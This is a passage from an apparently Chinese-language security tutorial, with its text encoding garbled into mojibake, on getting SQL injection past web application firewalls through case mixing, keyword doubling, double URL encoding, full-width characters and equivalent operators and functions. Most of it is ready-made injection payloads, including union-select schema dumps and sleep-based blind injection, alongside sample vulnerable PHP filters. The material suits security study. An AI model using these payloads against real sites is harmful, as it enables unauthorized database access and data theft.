<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order/*%%!asd%%%%*/by 1#
</span></span></code></pre></div><h2 id="3-å¤§å°å†™ç»•è¿‡">#3 å¤§å°å†™ç»•è¿‡
</h2><p>æœ‰çš„WAFåªé’ˆå¯¹å°å†™çš„ï¼ˆæˆ–è€…å¤§å†™çš„ï¼‰æŸ¥è¯¢è¯­å¥åšäº†è¿‡æ»¤ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;union&#39;</span>) <span style="color:#56b6c2">!&lt;</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">strpos</span>(<span style="color:#e06c75">$id</span>, <span style="color:#98c379">&#39;select&#39;</span>) <span style="color:#56b6c2">!&lt;/</span><span style="color:#e06c75">mark</span><span style="color:#56b6c2">&gt;</span> <span style="color:#c678dd">false</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">die</span>(<span style="color:#98c379">&#39;error&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
</span></span></code></pre></div><p><strong>ç„¶è€Œå¾ˆå¤šsqlæ•°æ®åº“æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„</strong>ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤§å°å†™äº¤é”™å†™æ¥ç»•è¿‡ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; uNiOn sElEcT 1,database()#
</span></span></code></pre></div><h2 id="4-åŒå†™ç»•è¿‡">#4 åŒå†™ç»•è¿‡
</h2><p>éƒ¨åˆ†WAFæ‰€åšçš„å·¥ä½œåªæ˜¯ç®€å•çš„æŠŠä¸å…è®¸å‡ºç°çš„æŸ¥è¯¢å†…å®¹ï¼ˆæ¯”å¦‚sqlè¯­å¥ï¼‰æ›¿æ¢æˆç©ºå­—ç¬¦ä¸²ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">str_replace</span>(<span style="color:#c678dd">array</span>(<span style="color:#98c379">&#39;union&#39;</span>, <span style="color:#98c379">&#39;select&#39;</span>), <span style="color:#98c379">&#39;&#39;</span>, <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; );
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>; 
</span></span></code></pre></div><p>è¿™ç§è¿‡æ»¤æ–¹å¼æ˜¯å¾ˆä¸å¯é çš„ï¼Œå› ä¸ºå°±ç®—æœ‰å±é™©å†…å®¹ï¼Œ<strong>ç®€é™‹è¿‡æ»¤ä¹‹åå‰©ä¸‹çš„éƒ¨åˆ†ä»ç„¶ä¼šè¿›å…¥æŸ¥è¯¢ï¼ˆä¸€æ¬¡è¿‡æ»¤ï¼‰</strong></p>
<p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡&quot;åŒå†™&quot;ï¼Œ<strong>æ¯”å¦‚<code>selselectect</code>ï¼Œæ›¿æ¢ä¸­é—´çš„<code>select</code>ä¸ºç©ºåï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ä»ç„¶æ˜¯<code>select</code>ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; uniunionon selselectect 1,2#
</span></span></code></pre></div><p>è¿‡æ»¤å™¨æ›¿æ¢åï¼š</p>
<pre tabindex="0"><code>1&#39; union select 1,2#
</code></pre><h2 id="5-ç¼–ç ç»•è¿‡">#5 ç¼–ç ç»•è¿‡
</h2><p>å¦‚æœWAFé’ˆå¯¹å…³é”®è¯è¿›è¡Œäº†åŒºåˆ†å¤§å°å†™çš„è¿‡æ»¤ï¼Œè¿™æ—¶å€™å°±ä¸èƒ½é€šè¿‡å¤§å°å†™å’ŒåŒå†™è’™æ··è¿‡å…³äº†</p>
<p><strong>ä¸è¿‡æ ¹æ®WAFä¸€æ¬¡è¿‡æ»¤çš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨å„ç§ç¼–ç æ„é€ å‡ºpayload</strong></p>
<h3 id="åŒé‡urlç¼–ç ç»•è¿‡">åŒé‡URLç¼–ç ç»•è¿‡
</h3><p><strong>å› ä¸ºä¸Šä¼ çš„payloadåªä¼šurlè§£æä¸€æ¬¡ï¼Œæˆ‘ä»¬æŠŠéƒ¨åˆ†å­—ç¬¦å†æ¬¡è¿›è¡Œurlç¼–ç ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union se%256cect 1,database()#
</span></span></code></pre></div><p>WAFéƒ¨åˆ†(<code>%25</code> -&gt; <code>%</code>)çœ‹è§çš„å†…å®¹æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union se%6cect 1,database()#
</span></span></code></pre></div><p>æ‰§è¡Œéƒ¨åˆ†(<code>%6c</code> -&gt; <code>l</code>)çœ‹è§çš„æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database()#
</span></span></code></pre></div><p>è¿™å°±æˆåŠŸä¼ å…¥äº†ç›®æ ‡è¯­å¥</p>
<p>é™„ä¸Šä¸€å¼ urlç¼–ç è¡¨ï¼š</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="URLç¼–ç è¡¨" href="http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png">
<img src="http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png" alt="URLç¼–ç è¡¨"  />
</a>
</div>
</p>
<h3 id="åå…­è¿›åˆ¶unicodeç¼–ç asciiç¼–ç ç»•è¿‡">åå…­è¿›åˆ¶ã€Unicodeç¼–ç ã€ASCIIç¼–ç ç»•è¿‡
</h3><p>å…¶å®å°±æ˜¯æŠŠè¿‡æ»¤çš„å­—ç¬¦è½¬æ¢æˆä¸åŒçš„ç¼–ç æ¬ºéª—WAFï¼Œæ¯”å¦‚åå…­è¿›åˆ¶ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1%ef%bc%87 or 1=1#
</span></span></code></pre></div><p>éƒ¨åˆ†WAFæ— æ³•è§£æ%ef%bc%87ï¼Œæ”¾è¡Œä¹‹åä¼šåœ¨æ‰§è¡Œsqlè¯­å¥çš„æœåŠ¡å™¨(æ¯”å¦‚IIS)è§£æï¼Œæ˜¯å…¨è§’å­—ç¬¦<code>ï¼‡</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1ï¼‡ OR 1=1
</span></span></code></pre></div><p>å½“ç„¶ä½ ä¹Ÿèƒ½ç›´æ¥è¾“å…¥å…¨è§’è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸€ä¸ªä¾‹å­</p>
<p>å…¶ä»–æ–¹å¼å¤§åŒå°å¼‚ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°</p>
<h2 id="6-ç­‰ä»·ä»£æ›¿ç»•è¿‡">#6 ç­‰ä»·ä»£æ›¿ç»•è¿‡
</h2><p><strong>WAFé™åˆ¶äº†æŸä¸€äº›çš„ç¬¦å·ã€è¯­å¥æˆ–è€…å‡½æ•°ï¼Œä½†æˆ‘ä»¬å¯ä»¥è®¾æ³•æ‰¾åˆ°åŠŸèƒ½ä¸€æ ·æˆ–ç›¸ä¼¼çš„æ¥ä»£æ›¿</strong></p>
<h3 id="é€»è¾‘ç¬¦å·è¿‡æ»¤">é€»è¾‘ç¬¦å·è¿‡æ»¤
</h3><h4 id="ç­‰å·è¿‡æ»¤ç»•è¿‡">ç­‰å·(=)è¿‡æ»¤ç»•è¿‡
</h4><p>åœ¨SQLè¯­å¥é‡Œï¼Œé™¤äº†=ï¼Œè¿˜æœ‰å¾ˆå¤šç”¨äºæ¯”è¾ƒçš„è¿ç®—ç¬¦ï¼š</p>
<ul>
<li><strong><code>like</code>ï¼šç”¨äºåŒ¹é…å­—ç¬¦ä¸²ï¼Œ<code>A like B</code>è¡¨ç¤ºBæ˜¯A</strong></li>
<li><strong><code>in</code>ï¼šç”¨äºæŸ¥æ‰¾ç›®æ ‡æ˜¯å¦åœ¨å¯¹åº”ç»„ä¸­</strong></li>
<li><strong><code>rlike</code>ï¼šåªè¦åŒ¹é…å­—ç¬¦ä¸²å‡ºç°å³å¯ï¼Œ<code>A rlike B</code>è¡¨ç¤ºBåœ¨Aé‡Œé¢</strong></li>
<li><strong><code>regexp</code>ï¼šå’Œ<code>rlike</code>ç”¨æ³•ä¸€æ ·</strong></li>
<li><strong><code>between</code>ï¼š<code>expr between ä¸‹ç•Œ and ä¸Šç•Œ</code>ï¼Œè¡¨ç¤ºæ˜¯å¦<code>expr &gt;= ä¸‹ç•Œ &amp;&amp; exp &lt;= ä¸Šç•Œ</code>ï¼Œä¸Šä¸‹ç•Œå¯ä»¥ç›¸ç­‰</strong></li>
</ul>
<p>å¦‚æœWAFè¿‡æ»¤äº†=ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»–ä»¬å®ç°ç›¸åŒç›®çš„ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;#
</span></span></code></pre></div><p>ä½¿ç”¨<code>like</code>åŒ¹é…ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &#39;users&#39;#
</span></span></code></pre></div><p>ä½¿ç”¨<code>in</code>åŒ¹é…ï¼ˆ<strong>æ³¨æ„inåŒ¹é…çš„å¯¹è±¡è¦æ˜¯ä¸€ä¸ªç»„</strong>ï¼‰ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&#39;users&#39;)#
</span></span></code></pre></div><p>ä½¿ç”¨<code>rlike</code>/<code>regexp</code>åŒ¹é…ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &#39;users&#39;#
</span></span></code></pre></div><p>ä½¿ç”¨betweenåˆ¤æ–­ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &#39;users&#39; and &#39;users&#39;#
</span></span></code></pre></div><h4 id="å¤§äºå·å’Œå°äºå·è¿‡æ»¤ç»•è¿‡">å¤§äºå·(&gt;)å’Œå°äºå·(&lt;)è¿‡æ»¤ç»•è¿‡
</h4><p>ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾</p>
<p>å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°greatest()å’Œleast()æ¥è¿›è¡Œç»•è¿‡äº†</p>
<p><mark><strong>greatest(n1,n2,n3,&hellip;)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,&hellip;)çš„æœ€å¤§å€¼ï¼Œleast()åˆ™æ˜¯è¿”å›æœ€å°å€¼ï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and greatest(ascii(substr(database(),0,1)),64)=64
</span></span></code></pre></div><p>ç­‰ä»·äºï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),0,1))&gt;64
</span></span></code></pre></div><h4 id="andå’Œorè¿‡æ»¤ç»•è¿‡">andå’Œorè¿‡æ»¤ç»•è¿‡
</h4><div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>ç¬¦å·</th>
          <th>ç­‰ä»·ç¬¦å·</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>and</td>
          <td>&amp;&amp;</td>
      </tr>
      <tr>
          <td>or</td>
          <td>||</td>
      </tr>
      <tr>
          <td>xor</td>
          <td>|</td>
      </tr>
      <tr>
          <td>not</td>
          <td>!</td>
      </tr>
  </tbody>
</table></div>
<h3 id="æ³¨é‡Šç¬¦å·è¿‡æ»¤">æ³¨é‡Šç¬¦å·è¿‡æ»¤
</h3><p><strong>å¦‚æœWAFè¿‡æ»¤äº†<code>#</code>å’Œ<code>-- </code> ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ª<code>'</code>é—­åˆåé¢çš„<code>'</code>ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2 or &#39;1
</span></span></code></pre></div><p>æˆ–è€…</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,&#39;2
</span></span></code></pre></div><h3 id="é€—å·è¿‡æ»¤">é€—å·è¿‡æ»¤
</h3><h4 id="ç»•è¿‡limitä¸­çš„é€—å·">ç»•è¿‡limitä¸­çš„é€—å·
</h4><p>åœ¨è¿›è¡Œç›²æ³¨æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦é€è¡Œè¯»å–æ•°æ®ï¼Œä¼šç”¨åˆ°<code>limit m, n</code></p>
<p><mark><strong>å¯ä»¥ä½¿ç”¨limit m offset nä»£æ›¿ï¼Œè¡¨ç¤ºå–mè¡Œï¼Œè·³è¿‡nè¡Œï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() limit 1 offset 0 #
</span></span></code></pre></div><p>ç­‰ä»·äº</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() limit 0,1 #
</span></span></code></pre></div><h4 id="ç»•è¿‡å‡½æ•°å‚æ•°ä¸­çš„é€—å·">ç»•è¿‡å‡½æ•°å‚æ•°ä¸­çš„é€—å·
</h4><p>å¾ˆå¤šå‡½æ•°éœ€è¦å¤šä¸ªå‚æ•°ï¼Œç”¨é€—å·éš”å¼€ï¼Œä¾‹å¦‚<code>substring(string, m, n)</code></p>
<p><mark><strong>å¯ä»¥ä½¿ç”¨substring(stringfrom m for n)ä»£æ›¿ï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database()from 1 for 1)=&#39;d&#39; #
</span></span></code></pre></div><p><strong>å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨()åŒ…è£¹fromå’Œforåé¢çš„æ•°å­—ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database()from(1)for(1))=&#39;d&#39; #
</span></span></code></pre></div><h4 id="ç»•è¿‡selectåˆ—è¡¨ä¸­çš„é€—å·">ç»•è¿‡selectåˆ—è¡¨ä¸­çš„é€—å·
</h4><p>unionè”åˆæŸ¥è¯¢æ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦ä¸€æ¬¡æ€§æŸ¥è¯¢å¤šä¸ªåˆ—ï¼Œå¦‚<code>union select user, password</code></p>
<p><mark><strong>å¯ä»¥ä½¿ç”¨joinè¯­å¥ä»£æ›¿ï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select * from (select database())a join (select version())b#
</span></span></code></pre></div><p>è¿™æ®µè¯­å¥æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿæˆ‘ä»¬é€ä¸€æ‹†è§£ï¼š</p>
<p><strong><code>(select database())a</code></strong>: åˆ›å»ºäº†ä¸€ä¸ªåªå«ä¸€åˆ—ï¼ˆæ•°æ®åº“åï¼‰çš„ä¸´æ—¶è¡¨ï¼Œå¹¶åˆ«åä¸º <code>a</code></p>
<p><strong><code>(select version())b</code></strong>: åˆ›å»ºäº†å¦ä¸€ä¸ªåªå«ä¸€åˆ—ï¼ˆç‰ˆæœ¬ä¿¡æ¯ï¼‰çš„ä¸´æ—¶è¡¨ï¼Œå¹¶åˆ«åä¸º <code>b</code></p>
<p><strong><code>... a join b</code></strong>: é€šè¿‡<code>join</code>å°†è¿™ä¸¤ä¸ªåªæœ‰ä¸€è¡Œä¸€åˆ—çš„è¡¨è¿æ¥èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ªä¸€è¡Œä¸¤åˆ—çš„æ–°è¡¨</p>
<p><strong><code>select * from...</code></strong>: æœ€åç”¨ <code>select *</code> å°†è¿™ä¸ªæ–°è¡¨çš„æ‰€æœ‰åˆ—ï¼ˆå³æˆ‘ä»¬æƒ³è¦çš„æ•°æ®åº“åå’Œç‰ˆæœ¬ä¿¡æ¯ï¼‰æŸ¥è¯¢å‡ºæ¥</p>
<p><strong>å½“ç„¶ï¼Œselectåé¢çš„å†…å®¹å¯ä»¥æ”¹æˆä½ æƒ³è¦çš„å†…å®¹ï¼Œselectçš„æ•°é‡ä¹Ÿæ ¹æ®å­—æ®µæ•°ç¡®å®šï¼Œå¤šjoinå‡ æ¬¡å°±è¡Œ</strong></p>
<h3 id="å‡½æ•°è¿‡æ»¤">å‡½æ•°è¿‡æ»¤
</h3><h4 id="å¸¸è§å‡½æ•°è¿‡æ»¤">å¸¸è§å‡½æ•°è¿‡æ»¤
</h4><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ç­‰ä»·å‡½æ•°ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">å¸¸ç”¨å‡½æ•°</th>
          <th style="text-align: left">ç­‰ä»·å‡½æ•°æˆ–è¯­æ³•</th>
          <th style="text-align: left">åŠŸèƒ½</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong><code>substring(str, m, n)</code></strong></td>
          <td style="text-align: left"><code>substr(str, m, n)</code><br><code>mid(str, m, n)</code><br /><code>reverse+left</code></td>
          <td style="text-align: left">æˆªå–å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>ascii(char)</code></strong></td>
          <td style="text-align: left"><code>ord(char)</code></td>
          <td style="text-align: left">è¿”å›å­—ç¬¦çš„ASCIIç </td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>if(exp1, exp2, exp3)</code></strong></td>
          <td style="text-align: left"><code>case when exp1 then exp2 else exp3 end</code></td>
          <td style="text-align: left">æ¡ä»¶åˆ¤æ–­è¯­å¥</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>database()</code></strong></td>
          <td style="text-align: left"><code>schema()</code></td>
          <td style="text-align: left">è¿”å›å½“å‰æ•°æ®åº“å</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>user()</code></strong></td>
          <td style="text-align: left"><code>current_user()</code><br><code>session_user()</code><br><code>system_user()</code><br /><code>@@user</code></td>
          <td style="text-align: left">è¿”å›å½“å‰æ•°æ®åº“ç”¨æˆ·</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>version()</code></strong></td>
          <td style="text-align: left"><code>@@version</code></td>
          <td style="text-align: left">è¿”å›æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>concat(s1, s2, ...)</code></strong></td>
          <td style="text-align: left"><code>concat_ws(sep, s1, s2, ...)</code><br><code>group_concat(name)</code></td>
          <td style="text-align: left">æ‹¼æ¥å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>hex(str)</code></strong></td>
          <td style="text-align: left"><code>0x...</code> (åå…­è¿›åˆ¶å­—é¢é‡)</td>
          <td style="text-align: left">å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>sleep(seconds)</code></strong></td>
          <td style="text-align: left"><code>benchmark(count, exp)</code></td>
          <td style="text-align: left">é€ æˆæ—¶é—´å»¶è¿Ÿ</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong><code>datadir()</code></strong></td>
          <td style="text-align: left"><code>@@datadir</code></td>
          <td style="text-align: left">è¿”å›æ•°æ®åº“è·¯å¾„</td>
      </tr>
  </tbody>
</table></div>
<p>å¤§éƒ¨åˆ†ç›¸ä¿¡éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œè¿™é‡Œä»‹ç»ä¸ªå‡ ä¸ªæ¯”è¾ƒä¸å¸¸è§çš„ï¼š</p>
<h4 id="case-whenè¯­å¥ä»£æ›¿if">case whenè¯­å¥ä»£æ›¿if
</h4><p><mark><strong>ç”¨æ³•ä¸€ï¼š</strong></mark> <strong><code>case when exp1 then exp2 else exp3 end</code></strong></p>
<p><strong>å¦‚æœexp1ä¸ºçœŸå°±è¿”å›exp2ï¼Œåä¹‹è¿”å›exp3</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
</span></span></code></pre></div><p><mark><strong>ç”¨æ³•äºŒï¼š</strong></mark> <strong><code>case x when y then exp2 else exp3 end</code></strong></p>
<p><strong>å¦‚æœx=yåˆ™è¿”å›exp2ï¼Œåä¹‹è¿”å›exp3</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
</span></span></code></pre></div><h4 id="reverseleftä»£æ›¿substring">reverse+leftä»£æ›¿substring
</h4><p><code>left</code>å‡½æ•°ä¸èƒ½æˆªå–æŸä¸€ä¸ªç²¾ç¡®çš„å­—ç¬¦ï¼Œä½†æ˜¯ç»“åˆ<code>reverse</code>å’Œ<code>ascii</code>å‡½æ•°å¯ä»¥åšåˆ°<code>substring+ascii</code>ä¸€æ ·çš„æ•ˆæœï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">ascii</span>(<span style="color:#e06c75">reverse</span>(<span style="color:#e06c75">left</span>(<span style="color:#e06c75">string</span>, <span style="color:#e06c75">n</span>)))
</span></span></code></pre></div><p><strong>è¿™ä¸ªç»„åˆå¯ä»¥åšåˆ°å–å‡ºstringå­—ç¬¦ä¸²ç¬¬nä½çš„asciiç </strong></p>
<p>æ€ä¹ˆå·¥ä½œçš„å‘¢ï¼Ÿæˆ‘ä»¬ä»¥<code>ascii(reverse(left('ABCDE', 3)))</code>ä¸ºä¾‹ï¼š</p>
<ul>
<li>
<p><strong><code>left('ABCDE', 3)</code></strong></p>
<p>é¦–å…ˆï¼Œ<code>left()</code>å‡½æ•°ä»å·¦è¾¹æˆªå–å‰3ä¸ªå­—ç¬¦ï¼Œå¾—åˆ°ç»“æœ <code>'ABC'</code></p>
</li>
<li>
<p><strong><code>reverse('ABC')</code></strong></p>
<p>æ¥ç€ï¼Œ<code>reverse()</code>å‡½æ•°å°†ä¸Šä¸€æ­¥çš„ç»“æœ<code>'ABC'</code>è¿›è¡Œåè½¬ï¼Œå¾—åˆ°<code>'CBA'</code></p>
</li>
<li>
<p><strong><code>ascii('CBA')</code></strong></p>
<p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œ<code>ascii()</code>å‡½æ•°ä¼šè¿”å›å…¶å‚æ•°å­—ç¬¦ä¸²çš„<strong>ç¬¬ä¸€ä¸ªå­—ç¬¦</strong>çš„ASCIIç </p>
<p>åœ¨è¿™é‡Œï¼Œå­—ç¬¦ä¸²<code>'CBA'</code>çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>'C'</code>ï¼Œå…¶ASCIIç æ˜¯<code>67</code></p>
</li>
</ul>
<h4 id="trimä»£æ›¿substring">trimä»£æ›¿substring
</h4><p>trim()å‡½æ•°åœ¨SQLä¸­ä¸»è¦ç”¨äºç§»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„å­—ç¬¦</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">trim</span>(<span style="color:#e06c75">both</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">leading</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">trailing</span> <span style="color:#e06c75">remstr</span> <span style="color:#e06c75">from</span> <span style="color:#e06c75">str</span>)
</span></span></code></pre></div><ul>
<li>
<p><strong><code>str</code></strong>: è¦å¤„ç†çš„æºå­—ç¬¦ä¸²</p>
</li>
<li>
<p><strong><code>remstr</code></strong>: è¦ä»<code>str</code>ä¸­ç§»é™¤çš„å­å­—ç¬¦ä¸²</p>
</li>
<li>
<p><strong><code>both|leading|trailing</code></strong>: æŒ‡å®šç§»é™¤çš„ä½ç½®</p>
<ul>
<li>
<p><code>leading</code>: åªä»<strong>å¼€å¤´</strong>ç§»é™¤</p>
</li>
<li>
